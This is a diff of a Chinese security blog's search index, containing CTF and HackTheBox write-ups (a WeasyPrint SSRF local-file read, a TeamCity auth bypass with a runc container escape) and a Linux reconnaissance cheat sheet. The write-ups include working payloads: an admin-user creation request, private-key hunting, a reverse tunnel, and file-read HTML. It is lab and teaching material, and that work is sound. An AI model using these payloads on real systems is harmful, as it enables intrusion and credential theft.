&quot;&quot;)</span><br><span class="line">        if is_valid_url(url):</span><br><span class="line">            try:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;</span><br><span class="line">                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;</span><br><span class="line"></span><br><span class="line">                return response</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f&#x27;Error generating PDF&#x27;, 500</span><br><span class="line">        else:</span><br><span class="line">            return f&#x27;Invalid URL! Target web address: &#x27; + url</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;index.html&quot;), 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
-
-<p>题目是没有给源码的，我们从题目一步步分析</p>
-<p>打开页面，有一个PDF转换器</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401215914318.png"></p>
-<p>存在输入URL大概率有SSRF，随便给个vps的发现不行</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401220042448.png"></p>
-<p>结合转换器是转换CSDN的，那么路径应该要有CSDN</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net</span><br></pre></td></tr></table></figure>
-
-<p>测试成功，我们在vps上开启监听看看</p>
-<p>获得信息<code>WeasyPrint 61.2</code></p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401220234808.png"></p>
-<p><strong>WeasyPrint</strong></p>
-<blockquote>
-<p>WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件</p>
-</blockquote>
-<p>我们可以借助HTML的标签实现文件读取 <a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">参考文章</a></p>
-<p>查看源码可以注意到我们能够使用 <code>&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</code>将任何网页或本地文件的内容附加到我们的 PDF 中</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401221004300.png"></p>
-<p>前面已经测试过存在SSRF，那么我们在vps上创建link.html文件然后去读取环境变量即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///proc/1/environ&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>回到题目，注意到源代码有个链接</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401223407178.png"></p>
-<p>结合css文件我们可以自己构造如下路径，并在vps上创建<code>blog.csdn.net</code>文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.html</span><br></pre></td></tr></table></figure>
-
-<p>结果不行，我们把<code>blog.csdn.net</code>去掉再读发现html没了（应该是被替换成空）</p>
-<p>直接双写绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.hthtmlml</span><br></pre></td></tr></table></figure>
-
-<p>得到pdf文件后用binwalk分离一下，得到flag</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401225931026.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>比赛</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NKCTF2024</title>
     <url>/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html</url>
     <content><![CDATA[<p>CVE-2019-9059、沙箱逃逸、CVE-2024-2044</p>
@@ -1473,6 +1420,59 @@
       </tags>
   </entry>
   <entry>
+    <title>NSSRound#20 Basic</title>
+    <url>/article/NSSRound-20-Basic.html</url>
+    <content><![CDATA[<p>114514</p>
+<span id="more"></span>
+
+
+
+
+
+<h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line">import re</span><br><span class="line">from flask_weasyprint import HTML, render_pdf</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.compile(</span><br><span class="line">    r&#x27;http(s)?://&#x27;  # http or https</span><br><span class="line">    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def is_valid_url(url):</span><br><span class="line">    if not URL_REGEX.match(url):</span><br><span class="line">        return False</span><br><span class="line">    if &quot;blog.csdn.net&quot; not in url:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def CsdnToPdf():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">        # 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span><br><span class="line">        url = url.replace(&quot;html&quot;, &quot;&quot;)</span><br><span class="line">        if is_valid_url(url):</span><br><span class="line">            try:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;</span><br><span class="line">                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;</span><br><span class="line"></span><br><span class="line">                return response</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f&#x27;Error generating PDF&#x27;, 500</span><br><span class="line">        else:</span><br><span class="line">            return f&#x27;Invalid URL! Target web address: &#x27; + url</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;index.html&quot;), 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
+
+<p>题目是没有给源码的，我们从题目一步步分析</p>
+<p>打开页面，有一个PDF转换器</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401215914318.png"></p>
+<p>存在输入URL大概率有SSRF，随便给个vps的发现不行</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401220042448.png"></p>
+<p>结合转换器是转换CSDN的，那么路径应该要有CSDN</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net</span><br></pre></td></tr></table></figure>
+
+<p>测试成功，我们在vps上开启监听看看</p>
+<p>获得信息<code>WeasyPrint 61.2</code></p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401220234808.png"></p>
+<p><strong>WeasyPrint</strong></p>
+<blockquote>
+<p>WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件</p>
+</blockquote>
+<p>我们可以借助HTML的标签实现文件读取 <a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">参考文章</a></p>
+<p>查看源码可以注意到我们能够使用 <code>&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</code>将任何网页或本地文件的内容附加到我们的 PDF 中</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401221004300.png"></p>
+<p>前面已经测试过存在SSRF，那么我们在vps上创建link.html文件然后去读取环境变量即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///proc/1/environ&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回到题目，注意到源代码有个链接</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401223407178.png"></p>
+<p>结合css文件我们可以自己构造如下路径，并在vps上创建<code>blog.csdn.net</code>文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.html</span><br></pre></td></tr></table></figure>
+
+<p>结果不行，我们把<code>blog.csdn.net</code>去掉再读发现html没了（应该是被替换成空）</p>
+<p>直接双写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.hthtmlml</span><br></pre></td></tr></table></figure>
+
+<p>得到pdf文件后用binwalk分离一下，得到flag</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401225931026.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Pov-HackTheBox</title>
     <url>/article/Pov-HackTheBox.html</url>
     <content><![CDATA[<p>AST.NET框架ViewState参数攻击、LFI本地文件包含漏洞、ysoserial反序列化漏洞、SeDebugPrivilege提权</p>
@@ -1594,6 +1594,107 @@
 <p>然后使用<code>migrate 548</code>命令将shell移到winlogon.exe进程里</p>
 <p>执行shell命令，成功提权拿到flag</p>
 <p><img src="/article/Pov-HackTheBox/image-20240406125219057.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Runner-HackTheBox</title>
+    <url>/article/Runner-HackTheBox.html</url>
+    <content><![CDATA[<p>JetBrains TeamCity 身份验证绕过漏洞、runC 逃逸漏洞</p>
+<span id="more"></span>
+
+<h1 id="Runner-HackTheBox"><a href="#Runner-HackTheBox" class="headerlink" title="Runner-HackTheBox"></a>Runner-HackTheBox</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.13</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        nginx 1.18.0 (Ubuntu)</span><br><span class="line">8000/tcp open  nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口发现重定向，添加到<code>/etc/hosts</code>后成功访问</p>
+<p>一番搜索没什么东西，扫一下目录和子域名</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518224235291.png"></p>
+<p>发现状态码为401，将该子域名添加到hosts文件，访问是登陆界面</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518224323364.png"></p>
+<p>扫一下目录</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518225531291.png"></p>
+<p>当我们访问<code>/404.html</code>的时候发现是JetBrains</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518225615781.png"></p>
+<p>由于是登陆界面，去网上找到篇文章是关于JetBrains TeamCity身份验证绕过的漏洞 <a href="https://forum.butian.net/share/2801">文章链接</a></p>
+<p>这里就不进行分析了，直接按照文章打exp</p>
+<p>获取用户列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx?jsp=/app/rest/users;.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240518230831965.png"></p>
+<p>可以看到存在四个用户</p>
+<p>我们添加管理员用户，payload如下（注意解析json数据）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;email&quot;: &quot;test@qq.com&quot;, &quot;roles&quot;: &#123;&quot;role&quot;: [&#123;&quot;roleId&quot;: &quot;SYSTEM_ADMIN&quot;, &quot;scope&quot;: &quot;g&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240518231558874.png"></p>
+<p>我们再查看下用户列表，发现添加test用户成功</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518231657492.png"></p>
+<p>看漏洞是说有两种可以getshell，一种是上传插件另外一种是利用token绕过权限命令执行</p>
+<p>测试一下都没成功，正确解法是管理界面存在备份文件</p>
+<p><img src="/article/Runner-HackTheBox/image-20240519231605539.png"></p>
+<p>下载下来后，在users文件找到用户及密码</p>
+<p><img src="/article/Runner-HackTheBox/image-20240519231756558.png"></p>
+<p>john的密码爆破要很久，成功爆破用户matthew的密码<code>piper123</code></p>
+<p>不过这里</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520201810126.png"></p>
+<p>我们继续去找私钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rnw . -e &quot;BEGIN OPENSSH PRIVATE KEY&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到文件路径<code>./config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code></p>
+<p>我们使用cp命令放到我们当前文件夹，尝试ssh登陆发现刚好就是john的私钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa john@10.10.11.13</span><br></pre></td></tr></table></figure>
+
+<p>拿到user的flag，由于不知道john的密码，无法用sudo提权</p>
+<p>只能分析一下网络连接的端口情况</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -nltp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240520202711385.png"></p>
+<p>这里注意到9000端口是开放的，使用工具chisel搭建隧道把目标9000端口映射到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel client 10.10.14.60:6150 R:9000:127.0.0.1:9000  #R表示反向隧道</span><br></pre></td></tr></table></figure>
+
+<p>在本机开启监听6150端口，并执行反向连接，然后靶机主动去监听ip为10.10.14.60的本机并将9000端口映射到本机9000端口</p>
+<p>首先在本地开启http服务，然后传上去chisel</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.60:777/chisel</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240520204727134.png"></p>
+<p>然后就是在本机开启监听后，靶机上执行命令即可搭建隧道</p>
+<p>注意两个点</p>
+<ul>
+<li>第一就是本机kali上pip安装的和我们传上去的chisel版本会不一致，所以传哪个本机上就用哪个</li>
+<li>第二就是记得赋予可执行权限给chisel</li>
+</ul>
+<p><img src="/article/Runner-HackTheBox/image-20240520210045416.png"></p>
+<p>搭建隧道成功后访问本地9000端口，发现是登陆界面</p>
+<p>我们拿刚刚爆破得到的用户密码成功登陆</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520211026329.png"></p>
+<p>是个管理容器的平台，点击容器查看docker版本为25.03，对应runc版本1.0.0-rc93</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520212110157.png"></p>
+<p>此版本的runc存在容器逃逸漏洞 <a href="https://nitroc.org/posts/cve-2024-21626-illustrated/">参考文章</a></p>
+<p>根据参考文章，攻击者可通过以下两种方式利用该漏洞：</p>
+<ul>
+<li>启动一个容器时将容器的工作目录设置为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code>为打开 &#x2F;sys&#x2F;fs&#x2F;cgroup 目录时返回的文件描述符，一般情况下为 7 或 8）。</li>
+<li>在容器中为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code> 为打开<code>/sys/fs/cgroup</code>目录时返回的文件描述符，一般情况下为 7 或 8） 创建一个符号链接。当外部在该容器中执行命令时，容器中可通过<code>/proc/&lt;PID&gt;/cwd</code>符号链接访问宿主机文件系统中的<code>/sys/fs/cgroup</code>目录，并利用形如<code>/proc/&lt;PID&gt;/cwd/../../../</code>的路径访问宿主机文件系统。</li>
+</ul>
+<p>我们先添加新的volume</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221407006.png"></p>
+<p>然后创建新容器</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221850313.png"></p>
+<p>修改工作目录</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221608215.png"></p>
+<p>注意要设置volume</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221701687.png"></p>
+<p>创建好后，进入控制台填上root去连接</p>
+<p>成功得到root的flag</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520220836933.png"></p>
 ]]></content>
       <categories>
         <category>渗透</category>
@@ -2251,6 +2352,93 @@
       </categories>
   </entry>
   <entry>
+    <title>信息搜集</title>
+    <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
+    <content><![CDATA[<p>渗透测试的信息搜集</p>
+<span id="more"></span>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>鹰图</strong> <a href="https://hunter.qianxin.com/">平台链接</a></p>
+<p><strong>360网络空间测绘</strong> <a href="https://quake.360.net/quake/#/index">平台链接</a></p>
+<p><strong>FOFA</strong> <a href="https://fofa.info/">平台链接</a></p>
+<h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><p><strong>版本信息</strong></p>
+<ul>
+<li><p><code>uname -a</code> 所有版本</p>
+</li>
+<li><p><code>uname -r</code> 内核版本信息</p>
+</li>
+<li><p><code>uname -n</code> 系统主机名字</p>
+</li>
+<li><p><code>uname -m</code> Linux内核架构</p>
+</li>
+<li><p>文件系统 <code>df -a</code></p>
+</li>
+</ul>
+<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul>
+<li><p>列出系统所有用户 <code>cat /etc/passwd</code></p>
+</li>
+<li><p>列出所有用户hash（root） <code>cat /etc/shadow</code></p>
+</li>
+<li><p>查询用户的基本信息 finger</p>
+</li>
+<li><p>当前登录的用户 users who -a &#x2F;var&#x2F;log&#x2F;utmp</p>
+</li>
+<li><p>查询无密码用户 grep ‘x:0:’ &#x2F;etc&#x2F;passwd</p>
+</li>
+<li><p>目前登录的用户 <code>w</code></p>
+</li>
+<li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p>
+</li>
+<li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p>
+</li>
+<li><p>登录成功日志 <code>/var/log/secure</code></p>
+</li>
+<li><p>登录失败日志 <code>/var/log/faillog</code></p>
+</li>
+<li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p>
+</li>
+<li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p>
+</li>
+<li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p>
+</li>
+<li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
+</li>
+<li><p>查看具有sudo权限的用户</p>
+<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
+</li>
+</ul>
+<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
+<li>打印系统环境信息 <code>env</code></li>
+<li>打印系统环境信息 <code>set</code></li>
+<li>环境变量中的路径信息 <code>echo $PATH</code></li>
+<li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li>
+<li>显示当前路径 <code>pwd</code></li>
+<li>显示默认系统遍历 <code>cat /etc/profile</code></li>
+<li>显示可用的shell <code>cat /etc/shells</code></li>
+</ul>
+<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul>
+<li>查看进程信息 <code>ps aux</code></li>
+<li>资源占有情况 <code>top -c</code></li>
+<li>查看进程关联文件 <code>lsof -c $PID</code></li>
+<li>完整命令行信息 <code>/proc/$PID/cmdline</code></li>
+<li>进程的命令名 <code>/proc/$PID/comm</code></li>
+<li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li>
+<li>运行程序的符号链接 <code>/proc/$PID/exe</code></li>
+<li>进程的环境变量 <code>/proc/$PID/environ</code></li>
+<li>进程打开文件的情况 <code>/proc/$PID/fd</code></li>
+</ul>
+<h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul>
+<li><code>~/.ssh</code></li>
+<li><code>/etc/ssh</code></li>
+</ul>
+<h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><ul>
+<li><code>/var/log/*</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+  </entry>
+  <entry>
     <title>fastjson入门学习</title>
     <url>/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html</url>
     <content><![CDATA[<p>记录对java安全的初次探索</p>
@@ -2506,93 +2694,6 @@
       </tags>
   </entry>
   <entry>
-    <title>信息搜集</title>
-    <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
-    <content><![CDATA[<p>渗透测试的信息搜集</p>
-<span id="more"></span>
-
-<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>鹰图</strong> <a href="https://hunter.qianxin.com/">平台链接</a></p>
-<p><strong>360网络空间测绘</strong> <a href="https://quake.360.net/quake/#/index">平台链接</a></p>
-<p><strong>FOFA</strong> <a href="https://fofa.info/">平台链接</a></p>
-<h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><p><strong>版本信息</strong></p>
-<ul>
-<li><p><code>uname -a</code> 所有版本</p>
-</li>
-<li><p><code>uname -r</code> 内核版本信息</p>
-</li>
-<li><p><code>uname -n</code> 系统主机名字</p>
-</li>
-<li><p><code>uname -m</code> Linux内核架构</p>
-</li>
-<li><p>文件系统 <code>df -a</code></p>
-</li>
-</ul>
-<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul>
-<li><p>列出系统所有用户 <code>cat /etc/passwd</code></p>
-</li>
-<li><p>列出所有用户hash（root） <code>cat /etc/shadow</code></p>
-</li>
-<li><p>查询用户的基本信息 finger</p>
-</li>
-<li><p>当前登录的用户 users who -a &#x2F;var&#x2F;log&#x2F;utmp</p>
-</li>
-<li><p>查询无密码用户 grep ‘x:0:’ &#x2F;etc&#x2F;passwd</p>
-</li>
-<li><p>目前登录的用户 <code>w</code></p>
-</li>
-<li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p>
-</li>
-<li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p>
-</li>
-<li><p>登录成功日志 <code>/var/log/secure</code></p>
-</li>
-<li><p>登录失败日志 <code>/var/log/faillog</code></p>
-</li>
-<li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p>
-</li>
-<li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p>
-</li>
-<li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p>
-</li>
-<li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
-</li>
-<li><p>查看具有sudo权限的用户</p>
-<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
-</li>
-</ul>
-<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
-<li>打印系统环境信息 <code>env</code></li>
-<li>打印系统环境信息 <code>set</code></li>
-<li>环境变量中的路径信息 <code>echo $PATH</code></li>
-<li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li>
-<li>显示当前路径 <code>pwd</code></li>
-<li>显示默认系统遍历 <code>cat /etc/profile</code></li>
-<li>显示可用的shell <code>cat /etc/shells</code></li>
-</ul>
-<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul>
-<li>查看进程信息 <code>ps aux</code></li>
-<li>资源占有情况 <code>top -c</code></li>
-<li>查看进程关联文件 <code>lsof -c $PID</code></li>
-<li>完整命令行信息 <code>/proc/$PID/cmdline</code></li>
-<li>进程的命令名 <code>/proc/$PID/comm</code></li>
-<li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li>
-<li>运行程序的符号链接 <code>/proc/$PID/exe</code></li>
-<li>进程的环境变量 <code>/proc/$PID/environ</code></li>
-<li>进程打开文件的情况 <code>/proc/$PID/fd</code></li>
-</ul>
-<h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul>
-<li><code>~/.ssh</code></li>
-<li><code>/etc/ssh</code></li>
-</ul>
-<h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><ul>
-<li><code>/var/log/*</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>博客常用设置</title>
     <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
     <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
@@ -2698,53 +2799,6 @@
       <tags>
         <tag>比赛</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>致远OA-ajax.do任意文件上传漏洞</title>
-    <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
-<span id="more"></span>
-
-<h1 id="致远OA-ajax-do任意文件上传漏洞"><a href="#致远OA-ajax-do任意文件上传漏洞" class="headerlink" title="致远OA-ajax.do任意文件上传漏洞"></a>致远OA-ajax.do任意文件上传漏洞</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
-<p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
-</blockquote>
-<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">致远OA V8.0</span><br><span class="line">致远OA V7.1、V7.1SP1</span><br><span class="line">致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">致远OA V6.0、V6.1SP1、V6.1SP2</span><br><span class="line">致远OA V5.x</span><br><span class="line">致远OA G6</span><br></pre></td></tr></table></figure>
-
-<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>首先验证漏洞是否存在，访问如下url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br></pre></td></tr></table></figure>
-
-<p>如果出现异常页面，则漏洞可能存在</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214529204.png"></p>
-<p>POC如下</p>
